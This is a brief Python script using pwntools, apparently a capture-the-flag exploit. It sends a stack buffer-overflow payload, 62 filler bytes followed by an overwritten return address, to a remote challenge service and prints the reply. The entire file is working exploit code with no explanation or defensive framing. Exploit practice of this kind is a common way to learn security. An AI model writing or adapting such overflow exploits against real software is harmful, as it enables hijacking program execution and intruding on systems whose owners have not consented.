from pwn import *

payload = 'A'*62+p32(0x804856b)

p = remote('hack.bckdr.in', 12001)
#p =process('./echo')
#pause()
p.sendline(payload)
print p.recvall()
